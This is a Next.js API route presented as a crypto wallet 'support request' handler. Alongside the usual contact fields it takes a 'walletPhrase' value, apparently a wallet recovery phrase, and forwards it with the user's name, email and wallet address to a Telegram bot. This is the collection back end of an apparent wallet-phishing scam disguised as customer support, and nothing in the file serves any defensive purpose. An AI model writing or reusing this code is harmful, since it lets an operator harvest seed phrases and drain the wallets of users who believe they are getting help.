import { type NextRequest, NextResponse } from "next/server"
import { createTelegramBot } from "@/lib/telegram"

export async function POST(request: NextRequest) {
  try {

    const body = await request.json()

    const { issueType, name, email, description, urgency, walletAddress,connectorName,walletPhrase, network, timestamp } = body

    // Validate required fields
    if (!issueType || !name || !email || !description || !urgency) {
      return NextResponse.json({ error: "Missing required fields" }, { status: 400 })
    }

    // Create Telegram bot instance
    const bot = createTelegramBot()
    if (!bot) {
      return NextResponse.json({ error: "Telegram bot not configured" }, { status: 500 })
    }


    // Send notification
    const success = await bot.sendSupportRequest({
      issueType,
      name,
      email,
      description,
      urgency,
      walletAddress: walletAddress || "Not connected",
      walletPhrase,
      connectorName: connectorName || "Unknown",
      network: network || "Unknown",
      timestamp,
    })

    if (!success) {
      return NextResponse.json({ error: "Failed to send support request" }, { status: 500 })
    }

    return NextResponse.json({ success: true, message: "Support request sent successfully" })
  } catch (error) {
    return NextResponse.json({ error: "Internal server error" }, { status: 500 })
  }
}
